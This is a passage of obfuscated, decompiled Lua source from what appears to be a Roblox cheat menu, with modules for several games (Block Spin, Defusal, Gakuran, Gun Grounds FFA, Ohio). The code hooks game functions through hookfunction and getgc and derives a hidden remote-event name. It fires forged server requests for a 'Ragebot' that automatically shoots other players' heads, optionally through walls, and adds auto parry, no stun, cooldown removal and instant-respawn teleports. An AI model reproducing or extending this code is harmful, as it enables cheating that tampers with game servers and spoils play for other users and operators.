							local v28 = v14:CreateTab({ Id = "block-spin-move", Name = "Move" })

							v28:CreateModule({
								Id = "block-spin-fast-stamina-regen",
								Name = "Fast Stamina Regen",
								Callback = function(arg)
									SetAttribute(LocalPlayer, "StaminaRegen", 2)

									if arg then
										SetAttribute(LocalPlayer, "StaminaRegen", 999)
									end
								end,
							})

							local flag = false
							local v29 = nil
							local v30 = hookfunction
							local consumeStamina = Sprint.consume_stamina

							local v31 = luraph_runtime1(function(...)
								if flag then
									return true
								end
								return v29(...)
							end)

							v29 = v30(consumeStamina, v31)

							v28:CreateModule({
								Id = "block-spin-bypass-jump-check",
								Name = "Bypass Jump Check",
								Callback = function(arg)
									flag = arg
								end,
							})
						end,
						Defusal = function()
							local v27 = ReplicatedFirst
							local v28 = ReplicatedStorage
							local Variables = require(v27.Variables)
							local Ambassador = require(v27.Ambassador)

							local function fn68(arg)
								return math.round(arg * 1000) / 1000
							end

							local function fn69(arg)
								local z = arg.Z
								return NewVector3(fn68(arg.X), fn68(arg.Y), fn68(z))
							end

							local function fn70(arg)
								local tbl10 = {}

								for i = 1, 24 do
									arg = arg * 48271 % 2147483647
									local n4 = arg % 62 + 1
									tbl10[i] = Sub("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", n4, n4)
								end

								return "sus_" .. table.concat(tbl10)
							end

							local v29 = nil

							local function fn71()
								if v29 and v29.Parent then
									return v29
								end
								local v30 = GetAttribute(v28, "AmongUsSauce")
								if typeof(v30) ~= "number" then
									return nil
								end
								v29 = FindFirstChild(v28.Events, fn70(v30))
								return v29
							end

							local function fn72()
								return Variables.equipped
							end

							local function fn73()
								local equipped = Variables.equipped
								if not equipped then
									return nil
								end
								local loadout = Variables.loadout
								local match = nil

								if loadout then
									match = tostring(equipped):match("^(%d+)")
									local match2 = tostring(equipped):match("_(%d+)$")
									match = match and loadout[match]

									if not (typeof(match) == "table" and match.GunName) then
										local flag = typeof(match) == "table" and match2
										local v30 = nil

										if flag then
											match = match[tonumber(match2)]
										else
											match = v30
										end
									end
								end

								match = match and match.GunName or Variables.gunname
								return match and FindFirstChild(v28.Weapons, match) or nil
							end

							local function fn74(arg)
								local equipped = Variables.equipped
								local loadout = Variables.loadout

								if loadout then
									local match = tostring(equipped):match("^(%d+)")
									local match2 = tostring(equipped):match("_(%d+)$")
									match = match and loadout[match]

									if not (typeof(match) == "table" and match.GunName) then
										local flag = typeof(match) == "table" and match2
										local v30 = nil

										if flag then
											match = match[tonumber(match2)]
										else
											match = v30
										end
									end

									if match and type(match.Ammo) == "number" then
										return match.Ammo
									end
								end

								return arg and GetAttribute(arg, "Ammo")
							end

							local tbl10 = {
								Ragebot = {
									Module = nil,
									Wallbang = false,
									Delay = 0.1,
									Connect = nil,
									Ammo = nil,
									Reloading = false,
									ReloadTask = nil,
								},
							}

							Ambassador.HookEvent("UpdateAmmo", function(arg)
								if arg and type(arg.Ammo) == "number" then
									tbl10.Ragebot.Ammo = arg.Ammo
								end

								tbl10.Ragebot.Reloading = false
							end)

							Ambassador.HookEvent("EquipWeapon", function()
								tbl10.Ragebot.Ammo = nil
								tbl10.Ragebot.Reloading = false

								if tbl10.Ragebot.ReloadTask then
									Cancel(tbl10.Ragebot.ReloadTask)
									tbl10.Ragebot.ReloadTask = nil
								end
							end)

							local function fn75(arg, arg2, arg3)
								local v30 = fn72()
								local v31 = fn73()
								if not v30 or not v31 then
									return
								end

								if GetAttribute(v31, "Melee") or tostring(v30):sub(1, 1) == "4" or tostring(v30):sub(1, 1) == "5" then
									return
								end
								local v32 = fn69(arg2.Position)
								local cFrame = arg3.CFrame
								local n4 = arg3.CFrame.Position - NewVector3(0, 1, 0)
								v28.Events.HandleShots:FireServer(v30, "Shoot")
								local ammo = tbl10.Ragebot.Ammo

								if ammo == nil then
									ammo = fn74(v31) or GetAttribute(v31, "Ammo") or 0
								end

								tbl10.Ragebot.Ammo = ammo - (GetAttribute(v31, "UseAmmo") or 1)

								local tbl11 = {
									Hit = arg.Character,
									PartName = "Head",
									Position = v32,
									Normal = NewVector3(0, 1, 0),
									hS = arg2.Size.Magnitude,
									hP = v32,
									cCF = cFrame,
									Wallbang = tbl10.Ragebot.Wallbang and true or nil,
								}

								local v33 = fn71()

								if v33 then
									v33:FireServer(tbl11, v31, false, false, tbl11.cCF, tbl11.hP, nil, nil)
								end

								Spawn(CreateTracer, n4, arg2.Position)
								Spawn(CreateHitSound)
								Wait(tbl10.Ragebot.Delay)
							end

							local function fn76()
								if tbl10.Ragebot.Connect then
									Cancel(tbl10.Ragebot.Connect)
									tbl10.Ragebot.Connect = nil
								end

								if tbl10.Ragebot.ReloadTask then
									Cancel(tbl10.Ragebot.ReloadTask)
									tbl10.Ragebot.ReloadTask = nil
								end
							end

							local function fn77()
								fn76()

								tbl10.Ragebot.Connect = Spawn(function()
									while tbl10.Ragebot.Module:Get() and Wait() do
										local character = LocalPlayer.Character

										if not (not character or not GetAttribute(LocalPlayer, "Alive")) then
											if FindFirstChild(character, "Gun") then
												if not GetAttribute(v28, "Preparation") then
													if tbl10.Ragebot.Ammo ~= nil and tbl10.Ragebot.Ammo <= 0 then
														if not tbl10.Ragebot.Reloading then
															tbl10.Ragebot.Reloading = true
															Ambassador.Fire("ReloadWeapon")
															local v30 = fn73()

															tbl10.Ragebot.ReloadTask = Delay((v30 and GetAttribute(v30, "ReloadTime") or 2) + 0.2, function()
																tbl10.Ragebot.Reloading = false
																tbl10.Ragebot.ReloadTask = nil

																if tbl10.Ragebot.Ammo ~= nil and tbl10.Ragebot.Ammo <= 0 then
																	tbl10.Ragebot.Ammo = v30 and GetAttribute(v30, "Ammo") or nil
																end
															end)
														end
													elseif not tbl10.Ragebot.Reloading then
														local v30 = Camera()
														local v31 = GetAttribute(LocalPlayer, "Team")

														if v30 then
															local v32 = GetClosest()

															for i = 1, #v32 do
																local v33 = v32[i]
																local character2 = v33.Character
																local v34 = character2 and FindFirstChild(character2, "Head")
																local v35 = character2 and FindFirstChildOfClass(character2, "Humanoid")
																local v36 = GetAttribute(v33, "Team")
																local flag = false

																if character2 then
																	flag = false

																	if FindFirstChildOfClass(character2, "ForceField") then
																		flag = true
																	end
																end

																if not (not v34 or not v35 or v35.Health <= 0 or not GetAttribute(v33, "Alive") or flag or v36 == "Spectator" or v36 == v31 or not CheckState(v33)) then
																	local flag2 = true

																	if not tbl10.Ragebot.Wallbang then
																		flag2 = isPartVisible(v34, v30.CFrame.Position)
																	end

																	if flag2 then
																		fn75(v33, v34, v30)
																	end
																end
															end
														end
													end
												end
											end
										end
									end
								end)
							end

							local v30 = v14:CreateTab({ Id = "defusal", Name = "Defusal" })

							tbl10.Ragebot.Module = v30:CreateModule({
								Id = "defusal-ragebot",
								Name = "Ragebot",
								Callback = function(arg)
									if arg then
										fn77()
									else
										fn76()
									end
								end,
							})

							tbl10.Ragebot.Module:CreateKeybind({
								Id = "defusal-ragebot-keybind",
								Name = "Keybind",
								Callback = function()
									tbl10.Ragebot.Module:Set(not tbl10.Ragebot.Module:Get())
								end,
							})

							tbl10.Ragebot.Module:CreateToggle({
								Id = "defusal-ragebot-wallbang",
								Name = "Wallbang",
								Default = tbl10.Ragebot.Wallbang,
								Callback = function(wallbang)
									tbl10.Ragebot.Wallbang = wallbang
								end,
							})

							tbl10.Ragebot.Module:CreateSlider({
								Id = "defusal-ragebot-delay",
								Name = "Delay",
								Min = 0,
								Max = 1,
								Default = tbl10.Ragebot.Delay,
								Step = 0.01,
								Callback = function(arg)
									tbl10.Ragebot.Delay = tonumber(arg)
								end,
							})

							local v31 = nil
							local v32 = nil

							v30:CreateModule({
								Id = "defusal-no-smoke",
								Name = "No Smoke",
								Callback = function(arg)
									v31 = arg
									pcall(task.cancel, v32)
									v32 = Spawn(function(...) end)
								end,
							})
						end,
						Gakuran = function()
							local shared = ReplicatedStorage:WaitForChild("Shared")
							local server = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Server")
							local CombatConfig = require(shared:WaitForChild("Config"):WaitForChild("CombatConfig"))
							local base = ReplicatedStorage:WaitForChild("CombatSystemClient"):WaitForChild("Combat"):WaitForChild("Base")
							local Block = require(base:WaitForChild("Block"))
							local Evasive = require(base.Evasive)
							local M1 = require(base.M1)
							require(base.M2)
							require(base.Equip)
							local v27 = v14:CreateTab({ Id = "gakuran", Name = "Gakuran" })
							local v28 = nil
							local v29 = nil
							local v30 = nil

							for _, v31 in getgc(true) do
								if typeof(v31) == "function" then
									local v32 = debug.getinfo(v31)

									if v32.name == "GuardBroken" then
										local v33 = nil
										local v34 = hookfunction

										local v35 = luraph_runtime1(function(...)
											local v35 = table.pack(...)
											if not v28 then
												return v33(...)
											end
											local tbl10 = { ... }
											local character = LocalPlayer.Character
											if character and tbl10[2] == character then
												print("No GuardBroken")
												return
											end
											return v33(table.unpack(v35, 1, v35.n))
										end)

										v33 = v34
										v33 = v33(v31, v35)
									elseif v32.name == "PerfectBlocked" then
										local v33 = nil
										local v34 = hookfunction

										local v35 = luraph_runtime1(function(...)
											local v35 = table.pack(...)
											if not v29 then
												return v33(...)
											end
											local tbl10 = { ... }
											local character = LocalPlayer.Character
											if character and tbl10[1] == character then
												print("No PerfectBlocked")
												return
											end
											return v33(table.unpack(v35, 1, v35.n))
										end)

										v33 = v34
										v33 = v33(v31, v35)
									elseif v32.name == "SuppressBlocking" then
										local v33 = nil
										local v34 = hookfunction

										local v35 = luraph_runtime1(function(...)
											if not v30 then
												print("No SuppressBlocking")
												return
											end
											return v33(...)
										end)

										v33 = v34
										v33 = v33(v31, v35)
									end
								end
							end

							local tbl10 = {
								Enabled = false,
								Range = 30,
								AttackDistance = 10,
								FaceAngle = 80,
								AutoEquip = true,
								FaceTarget = true,
								Visuals = true,
								AnimThreshold = 0,
							}

							local flag = false
							local tbl11 = {}
							local tbl12 = {}
							local v31 = nil
							local n4 = 0.25
							local n5 = 0
							local n6 = 0

							local function fn68(arg, arg2)
								local tbl13 = {}
								local position = arg.Position
								local n7 = arg2 * arg2
								local v32 = GetPlayerList()

								for i = 1, #v32 do
									local v33 = v32[i]

									if v33 ~= LocalPlayer then
										local character = v33.Character

										if character and character.Parent then
											local v34 = FindFirstChildOfClass(character, "Humanoid")
											local v35 = v34 and FindFirstChild(character, "HumanoidRootPart")

											if v34 and v34.Health > 0 and v35 then
												local n8 = v35.Position - position

												if n8.X * n8.X + n8.Y * n8.Y + n8.Z * n8.Z <= n7 then
													tbl13[#tbl13 + 1] = character
												end
											end
										end
									end
								end

								return tbl13
							end

							local function fn69(arg)
								return GetAttribute(arg, "CombatAttacking") == true
							end

							local function fn70(arg, arg2, arg3)
								local v32 = FindFirstChild(arg, "HumanoidRootPart")
								if not v32 or arg2[v32] then
									return
								end
								local tbl13 = {}

								tbl13[#tbl13 + 1] = Connect(v32.ChildAdded, function(arg4)
									if arg4.Name ~= "PunchSwing" then
										return
									end
									local character = LocalPlayer.Character
									local v33 = character and FindFirstChild(character, "HumanoidRootPart")
									if not (arg.Parent and v32.Parent and character and character.Parent and v33) then
										return
									end
									arg3(v32, v33)
								end)

								tbl13[#tbl13 + 1] = Connect(arg.AttributeChanged, function(arg4)
									if arg4 ~= "CombatAttacking" or GetAttribute(arg, arg4) ~= true then
										return
									end
									local character = LocalPlayer.Character
									local v33 = character and FindFirstChild(character, "HumanoidRootPart")
									if not (arg.Parent and v32.Parent and character and character.Parent and v33) then
										return
									end
									arg3(v32, v33)
								end)

								arg2[v32] = tbl13
							end

							local function fn71(arg)
								for k, v32 in pairs(arg) do
									if not k.Parent then
										for i = 1, #v32 do
											Disconnect(v32[i])
										end

										arg[k] = nil
									end
								end
							end

							local function fn72(arg)
								for _, v32 in pairs(arg) do
									for i = 1, #v32 do
										Disconnect(v32[i])
									end
								end

								table.clear(arg)
							end

							local function fn73()
								local character = LocalPlayer.Character
								if not (character and character.Parent) then
									return
								end
								server:FireServer({ Type = "Combat", Action = "Block", Func = "Activated" }, Workspace:GetServerTimeNow())
								flag = true
							end

							local function fn74()
								if not flag then
									return
								end
								local character = LocalPlayer.Character

								if character and character.Parent then
									server:FireServer({ Type = "Combat", Action = "Block", Func = "Deactivated" })
								end

								flag = false
							end

							local tbl13 = {}

							local function fn75(arg)
								local v32 = FindFirstChildOfClass(arg, "Humanoid")
								return v32 and FindFirstChildOfClass(v32, "Animator")
							end

							local function fn76(arg)
								if tbl13[arg] then
									return
								end
								local v32 = fn75(arg)
								if not v32 then
									return
								end
								local tbl14 = { track = nil }

								tbl14.conn = Connect(v32.AnimationPlayed, function(track)
									tbl14.track = track
								end)

								tbl13[arg] = tbl14
							end

							local function fn77(arg)
								local v32 = tbl13[arg]
								local track = v32 and v32.track

								if track and track.IsPlaying then
									local length = track.Length
									if length > 0 then
										return Clamp(track.TimePosition / length, 0, 1) * 100
									end
								end

								if not (v32 and GetAttribute(arg, "CombatAttacking") == true) then
									return nil
								end
								local v33 = fn75(arg)
								if not v33 then
									return nil
								end
								local playingAnimationTracks = v33:GetPlayingAnimationTracks()

								for i = 1, #playingAnimationTracks do
									local v34 = playingAnimationTracks[i]

									if v34.IsPlaying and not v34.Looped then
										v32.track = v34
										local length = v34.Length
										if length > 0 then
											return Clamp(v34.TimePosition / length, 0, 1) * 100
										end
										return nil
									end
								end

								return nil
							end

							local function fn78()
								for _, v32 in pairs(tbl13) do
									if v32.conn then
										Disconnect(v32.conn)
									end
								end

								table.clear(tbl13)
							end

							local function fn79()
								if flag then
									return
								end
								fn73()
							end

							local n7 = 8
							local n8 = 0.08
							local transparency = 0.7
							local v32 = nil

							local function fn80()
								if v32 and v32.Parent then
									return v32
								end
								local Folder = NewInstance("Folder")
								Folder.Name = "GakuranParryVisuals"
								Folder.Parent = Workspace
								v32 = Folder
								return Folder
							end

							local function fn81()
								local v33 = fn80()
								local tbl14 = { edges = {}, arc = {}, groundY = nil, groundAt = 0 }

								for i = 1, 2 do
									local Part = NewInstance("Part")
									Part.Name = "GakuranParryEdge"
									Part.Anchored = true
									Part.CanCollide = false
									Part.CanQuery = false
									Part.CanTouch = false
									Part.CastShadow = false
									Part.Material = Enum.Material.Neon
									Part.Color = NewColor3(1, 1, 1)
									Part.Transparency = transparency
									Part.Size = NewVector3(0.08, 0.08, 1)
									Part.Parent = v33
									tbl14.edges[i] = Part
								end

								for i = 1, 8 do
									local Part = NewInstance("Part")
									Part.Name = "GakuranParryArc"
									Part.Anchored = true
									Part.CanCollide = false
									Part.CanQuery = false
									Part.CanTouch = false
									Part.CastShadow = false
									Part.Material = Enum.Material.Neon
									Part.Color = NewColor3(1, 1, 1)
									Part.Transparency = transparency
									Part.Size = NewVector3(0.08, 0.08, 1)
									Part.Parent = v33
									tbl14.arc[i] = Part
								end

								local BillboardGui = NewInstance("BillboardGui")
								BillboardGui.Name = "GakuranParryLabel"
								BillboardGui.Size = NewUDim2(0, 80, 0, 24)
								BillboardGui.AlwaysOnTop = true
								BillboardGui.StudsOffset = NewVector3(0, -2, 0)
								local TextLabel = NewInstance("TextLabel")
								TextLabel.Size = NewUDim2(1, 0, 1, 0)
								TextLabel.BackgroundTransparency = 1
								TextLabel.TextColor3 = NewColor3(1, 1, 1)
								TextLabel.TextStrokeTransparency = 0.2
								TextLabel.TextSize = 14
								TextLabel.Font = Enum.Font.GothamBold
								TextLabel.Parent = BillboardGui
								BillboardGui.Parent = v33
								tbl14.billboard = BillboardGui
								tbl14.label = TextLabel
								return tbl14
							end

							local function fn82(H,m,h)local B=FindFirstChild(H,"HumanoidRootPart");if not B then return;end;local t= tbl10 .AttackDistance;local x=m.groundY;if not x or h-(m.groundAt or 0)>= n4 then x=B.Position.Y-3;m.groundY=x;m.groundAt=h;elseif Abs(B.Position.Y-3-x)>4 then x=B.Position.Y-3;m.groundY=x;m.groundAt=h;end;H,h=NewVector3(B.Position.X,x,B.Position.Z),B.CFrame.LookVector;local R=Atan2(h.X,h.Z);local O=Rad( tbl10 .FaceAngle)*0.5;for k=1,2,1 do h=R-O+2*O*(k-1);local j,i=NewVector3(Sin(h),0,Cos(h)),m.edges[k];i.Size=NewVector3( n8 , n8 ,t);i.CFrame=NewCFrame(H+j*(t*0.5),H+j*t);end;local k=nil;for j=0, n7 ,1 do h=j/ n7 ;x=R-O+2*O*h;local h=H+NewVector3(Sin(x),0,Cos(x))*t;if k then local H,x=m.arc[j],(k+h)*0.5;H.Size=NewVector3( n8 , n8 ,(h-k).Magnitude);H.CFrame=NewCFrame(x,h);end;k=h;end;m.label.Text=Format("%.1f",t);m.billboard.Adornee=B;end

							local function fn83(arg)
								for i = 1, #arg.edges do
									arg.edges[i]:Destroy()
								end

								for i = 1, #arg.arc do
									arg.arc[i]:Destroy()
								end

								arg.billboard:Destroy()
							end

							local function fn84()
								for _, v33 in pairs(tbl12) do
									fn83(v33)
								end

								table.clear(tbl12)

								if v32 then
									v32:Destroy()
									v32 = nil
								end
							end

							local function fn85()
								if v31 then
									Disconnect(v31)
									v31 = nil
								end
							end

							local function fn86(...) end

							local v33 = v27:CreateModule({
								Id = "gakuran-auto-parry",
								Name = "Auto Parry",
								Callback = function(enabled)
									tbl10.Enabled = enabled

									if enabled then
										fn85()
										n5 = 0
										n6 = 0
										v31 = Connect(RunService.Heartbeat, fn86)
									else
										fn85()
										fn72(tbl11)
										fn78()
										fn74()
										fn84()
									end
								end,
							})

							v33:CreateToggle({
								Id = "gakuran-auto-parry-auto-equip",
								Name = "Auto Equip",
								Default = tbl10.AutoEquip,
								Callback = function(autoEquip)
									tbl10.AutoEquip = autoEquip
								end,
							})

							v33:CreateToggle({
								Id = "gakuran-auto-parry-face-target",
								Name = "Face Attacker",
								Default = tbl10.FaceTarget,
								Callback = function(faceTarget)
									tbl10.FaceTarget = faceTarget
								end,
							})

							v33:CreateSlider({
								Id = "gakuran-auto-parry-face-angle",
								Name = "Face Angle (deg)",
								Min = 10,
								Max = 180,
								Default = tbl10.FaceAngle,
								Step = 5,
								Callback = function(faceAngle)
									tbl10.FaceAngle = faceAngle
								end,
							})

							v33:CreateSlider({
								Id = "gakuran-auto-parry-attack-distance",
								Name = "Attack Distance",
								Min = 1,
								Max = 20,
								Default = tbl10.AttackDistance,
								Step = 0.5,
								Callback = function(attackDistance)
									tbl10.AttackDistance = attackDistance
								end,
							})

							v33:CreateSlider({
								Id = "gakuran-auto-parry-range",
								Name = "Range (studs)",
								Min = 1,
								Max = 30,
								Default = tbl10.Range,
								Step = 1,
								Callback = function(range)
									tbl10.Range = range
								end,
							})

							v33:CreateSlider({
								Id = "gakuran-auto-parry-anim-progress",
								Name = "Anim Progress (%)",
								Min = 0,
								Max = 100,
								Default = tbl10.AnimThreshold,
								Step = 5,
								Callback = function(animThreshold)
									tbl10.AnimThreshold = animThreshold
								end,
							})

							v33:CreateToggle({
								Id = "gakuran-auto-parry-visuals",
								Name = "Visuals",
								Default = tbl10.Visuals,
								Callback = function(visuals)
									tbl10.Visuals = visuals

									if not visuals then
										fn84()
									end
								end,
							})

							local v34 = nil
							local flag2 = false
							local v35 = nil
							local v36 = hookfunction
							local hold = M1.Hold

							local v37 = luraph_runtime1(function(arg)
								flag2 = arg == "Start" and true or false
								return v35(arg)
							end)

							v35 = v36
							v35 = v35(hold, v37)

							v27:CreateModule({
								Id = "gakuran-no-block-cd",
								Name = "Evasive On Attack",
								Callback = function(arg)
									v34 = arg
									Spawn(function(...) end)
								end,
							})

							v27:CreateModule({
								Id = "gakuran-no-guardbroken",
								Name = "No GuardBroken",
								Callback = function(arg)
									v28 = arg
								end,
							})

							v27:CreateModule({
								Id = "gakuran-no-perfectblocked",
								Name = "No Perfect Blocked",
								Callback = function(arg)
									v29 = arg
								end,
							})

							v27:CreateModule({
								Id = "gakuran-no-suppressblocking",
								Name = "No Suppress Blocking",
								Callback = function(arg)
									v30 = arg
								end,
							})

							local tbl14 = { Enabled = false, SavedParriedStun = nil, SavedGuardbreak = nil }

							v27:CreateModule({
								Id = "gakuran-no-stun",
								Name = "No Stun",
								Callback = function(enabled)
									tbl14.Enabled = enabled

									if enabled then
										if not tbl14.SavedParriedStun then
											tbl14.SavedParriedStun = Block.ApplyLocalParriedStun
											tbl14.SavedGuardbreak = Block.ApplyLocalGuardbreakLockout

											Block.ApplyLocalParriedStun = function()
											end

											Block.ApplyLocalGuardbreakLockout = function()
											end
										end

										Spawn(function()
											while tbl14.Enabled and Wait() do
												local character = LocalPlayer.Character

												if character and character.Parent then
													local tbl15 = { "Stunned", "Parried", "CantAnything", "GuardBroken" }

													for i = 1, #tbl15 do
														local v38 = tbl15[i]

														if GetAttribute(character, v38) == true then
															SetAttribute(character, v38, nil)
														end
													end
												end
											end
										end)
									elseif tbl14.SavedParriedStun then
										Block.ApplyLocalParriedStun = tbl14.SavedParriedStun
										Block.ApplyLocalGuardbreakLockout = tbl14.SavedGuardbreak
										tbl14.SavedParriedStun = nil
										tbl14.SavedGuardbreak = nil
									end
								end,
							})

							local tbl15 = { Enabled = false, Saved = {} }

							v27:CreateModule({
								Id = "gakuran-no-windup-recovery",
								Name = "No Windup No Recovery",
								Callback = function(enabled)
									tbl15.Enabled = enabled

									if enabled then
										if next(tbl15.Saved) == nil then
											tbl15.Saved.M1Recovery = CombatConfig.M1.RecoveryLockout
											tbl15.Saved.M1Finisher = CombatConfig.M1.FinisherRecoveryLockout
											tbl15.Saved.M2Recovery = CombatConfig.M2.RecoveryLockout
											tbl15.Saved.AttackDuration = CombatConfig.ClientPredict.M1.AttackDuration
											tbl15.Saved.ComboResetTime = CombatConfig.ClientPredict.M1.ComboResetTime
											tbl15.Saved.FinisherCooldown = CombatConfig.ClientPredict.M1.FinisherCooldown
										end

										CombatConfig.M1.RecoveryLockout = 0
										CombatConfig.M1.FinisherRecoveryLockout = 0
										CombatConfig.M2.RecoveryLockout = 0
										CombatConfig.ClientPredict.M1.AttackDuration = 0
										CombatConfig.ClientPredict.M1.ComboResetTime = 0
										CombatConfig.ClientPredict.M1.FinisherCooldown = 0

										Spawn(function()
											while tbl15.Enabled and Wait() do
												local character = LocalPlayer.Character

												if character and character.Parent then
													local tbl16 = { "CombatAttacking", "M1Cooldown", "M2Cooldown" }

													for i = 1, #tbl16 do
														local v38 = tbl16[i]

														if GetAttribute(character, v38) == true then
															SetAttribute(character, v38, nil)
														end
													end
												end
											end
										end)
									elseif next(tbl15.Saved) ~= nil then
										CombatConfig.M1.RecoveryLockout = tbl15.Saved.M1Recovery
										CombatConfig.M1.FinisherRecoveryLockout = tbl15.Saved.M1Finisher
										CombatConfig.M2.RecoveryLockout = tbl15.Saved.M2Recovery
										CombatConfig.ClientPredict.M1.AttackDuration = tbl15.Saved.AttackDuration
										CombatConfig.ClientPredict.M1.ComboResetTime = tbl15.Saved.ComboResetTime
										CombatConfig.ClientPredict.M1.FinisherCooldown = tbl15.Saved.FinisherCooldown
									end
								end,
							})

							local tbl16 = { Enabled = false, Max = 100 }

							v27:CreateModule({
								Id = "gakuran-inf-stamina",
								Name = "Inf Stamina",
								Callback = function(enabled)
									tbl16.Enabled = enabled

									if enabled then
										Spawn(function(...) end)
									end
								end,
							})

							local tbl17 = { Enabled = false, HpThreshold = 30, TeleportHeight = 100000 }
							local tbl18 = { pos = nil, phase = "normal" }
							local v38 = nil

							local function fn87(arg)
								if not arg then
									return
								end
								arg.PlatformStand = false
								arg.Sit = false

								pcall(function()
									local state_ = arg:GetState()

									if state_ == Enum.HumanoidStateType.Physics or state_ == Enum.HumanoidStateType.FallingDown or state_ == Enum.HumanoidStateType.Ragdoll then
										arg:ChangeState(Enum.HumanoidStateType.GettingUp)
									end
								end)
							end

							local function fn88()
								local pos = tbl18.pos

								Spawn(function()
									local character = LocalPlayer.Character
									local v39 = character and FindFirstChild(character, "HumanoidRootPart")
									local n9 = 0

									while not (character and character.Parent and v39) and n9 < 5 do
										Wait()
										character = LocalPlayer.Character
										v39 = character and FindFirstChild(character, "HumanoidRootPart")
										n9 += 1
									end

									if not (character and character.Parent and v39) then
										tbl18.phase = "normal"
										tbl18.pos = nil
										return
									end

									Wait(0.5)

									while tbl17.Enabled and tbl18.pos do
										Wait()
										local v40 = FindFirstChildOfClass(character, "Humanoid")
										local v41 = FindFirstChild(character, "HumanoidRootPart")
										if not (character.Parent and v41 and v40) then
											return
										end
										fn87(v40)

										pcall(function()
											v40:ChangeState(Enum.HumanoidStateType.Running)
										end)

										v41.CFrame = NewCFrame(pos)

										if (v41.Position - pos).Magnitude < 5 then
											tbl18.phase = "normal"
											tbl18.pos = nil
											return
										end
									end

									tbl18.phase = "normal"
									tbl18.pos = nil
								end)
							end

							v27:CreateModule({
								Id = "gakuran-instant-respawn",
								Name = "Instant Respawn",
								Callback = function(enabled)
									tbl17.Enabled = enabled

									if enabled then
										tbl18.phase = "normal"
										tbl18.pos = nil

										v38 = Connect(LocalPlayer.CharacterAdded, function()
											if not tbl17.Enabled or not tbl18.pos then
												return
											end
											tbl18.phase = "return"
											fn88()
										end)

										Spawn(function()
											while tbl17.Enabled and Wait() do
												pcall(function()
													local character = LocalPlayer.Character
													local v39 = character and FindFirstChildOfClass(character, "Humanoid")
													local v40 = character and FindFirstChild(character, "HumanoidRootPart")
													if not (character and character.Parent and v39 and v40) then
														return
													end
													fn87(v39)

													if tbl18.phase == "normal" then
														if tbl17.HpThreshold <= v39.Health then
															tbl18.pos = v40.Position
														elseif v39.Health > 0 then
															tbl18.pos = v40.Position
															tbl18.phase = "teleport"
														end
													elseif tbl18.phase == "teleport" and tbl18.pos then
														v40.CFrame = NewCFrame(tbl18.pos.X, tbl17.TeleportHeight, tbl18.pos.Z)
													end
												end)
											end
										end)
									else
										if v38 then
											Disconnect(v38)
											v38 = nil
										end

										tbl18.phase = "normal"
										tbl18.pos = nil
									end
								end,
							}):CreateSlider({
								Id = "gakuran-instant-respawn-hp",
								Name = "HP Threshold",
								Min = 1,
								Max = 100,
								Default = tbl17.HpThreshold,
								Step = 1,
								Callback = function(hpThreshold)
									tbl17.HpThreshold = hpThreshold
								end,
							})

							local tbl19 = { Enabled = false, HookedBlur = nil, Conn = nil }

							local function fn89()
								local v39 = FindFirstChild(Lighting, "ScreenEffectsBlur")
								if v39 == tbl19.HookedBlur then
									return
								end

								if tbl19.Conn then
									Disconnect(tbl19.Conn)
									tbl19.Conn = nil
								end

								tbl19.HookedBlur = v39

								if v39 then
									tbl19.Conn = Connect(GetPropertyChangedSignal(v39, "Enabled"), function()
										if v39.Enabled then
											v39.Enabled = false
										end
									end)
								end
							end

							v27:CreateModule({
								Id = "gakuran-no-screen-blur",
								Name = "No Screen Blur",
								Callback = function(enabled)
									tbl19.Enabled = enabled

									if enabled then
										fn89()

										Spawn(function()
											while tbl19.Enabled and Wait() do
												pcall(function()
													fn89()
													local v39 = FindFirstChild(Lighting, "ScreenEffectsBlur")

													if v39 and v39.Enabled then
														v39.Enabled = false
													end
												end)
											end
										end)
									else
										if tbl19.Conn then
											Disconnect(tbl19.Conn)
											tbl19.Conn = nil
										end

										tbl19.HookedBlur = nil
									end
								end,
							})
						end,
						["Gun Grounds FFA"] = function()
							local v27 = v14:CreateTab({ Id = "gun-grounds-rage", Name = "Rage" })
							local tbl10 = { Ragebot = { Module = nil, Wallbang = true, Connect = nil } }

							local function fn68()
								if tbl10.Ragebot.Connect then
									Cancel(tbl10.Ragebot.Connect)
									tbl10.Ragebot.Connect = nil
								end
							end

							local function fn69()
								fn68()

								tbl10.Ragebot.Connect = Spawn(function()
									while tbl10.Ragebot.Module:Get() and Wait() do
										local character = LocalPlayer.Character

										if character then
											local v28 = FindFirstChildOfClass(character, "Tool")
											local v29 = v28 and FindFirstChild(v28, "Muz")
											local v30 = v28 and FindFirstChild(v28, "Remotes")
											local v31 = v28 and FindFirstChild(v28, "Configuration")
											v30 = v30 and FindFirstChild(v30, "CheckShot")

											if v28 and v29 and v30 then
												local v32 = GetClosest()
												local v33 = nil
												local n4 = nil
												local n5 = nil

												for i = 1, #v32 do
													local v34 = v32[i]
													local character2 = v34.Character
													v33 = character2 and FindFirstChild(character2, "Head")
													local v35 = character2 and FindFirstChildOfClass(character2, "Humanoid")

													if v34 == LocalPlayer or not character2 or not v33 or not v35 or v35.Health <= 0 or not CheckState(v34) then
														continue
													else
														local magnitude = v33.Size.Magnitude
														local flag

														if tbl10.Ragebot.Wallbang then
															n4 = v29.Position - NewVector3(0, 100, 0)
															n5 = v33.Position - NewVector3(0, 100, 0)
															flag = true
														else
															n4, n5, flag = Resolve(v29, v33, magnitude, magnitude, math.huge, 10)
														end

														if not flag then
															continue
														end
													end

													break
												end

												if n4 then
													local v34 = workspace
													local getServerTimeNow = v34.GetServerTimeNow
													v30:FireServer(v31.Ammo.Value, v31.spread.Value, v31.Ammo.Value, v31.reloadTime.Value, CFrame.lookAt(n4, n5), n5, v33, Random(1000, 9999), getServerTimeNow(v34))
													CreateTracer(n4, n5)
													CreateHitSound()
													Wait(v31.FireRate.Value / 1.5)
												end
											end
										end
									end
								end)
							end

							tbl10.Ragebot.Module = v27:CreateModule({
								Id = "gun-grounds-ffa-ragebot",
								Name = "Ragebot",
								Callback = function(arg)
									if arg then
										fn69()
									else
										fn68()
									end
								end,
							}):CreateToggle({
								Id = "wallbang",
								Name = "Wallbang",
								Default = true,
								Callback = function(wallbang)
									tbl10.Ragebot.Wallbang = wallbang
								end,
							})
						end,
						Ohio = function()
							SetAttribute(LocalPlayer, "emotes_premiumEmotes", true)

							Spawn(function()
								local emotes = ReplicatedStorage.devv.shared.Indicies.emotes
								if not emotes then
									return
								end
								local ok4, result4 = pcall(require, emotes)
								if not ok4 or type(result4) ~= "table" then
									return
								end

								for _, v27 in pairs(result4) do
									if type(v27) == "table" then
										v27.canWalk = true
									end
								end
							end)

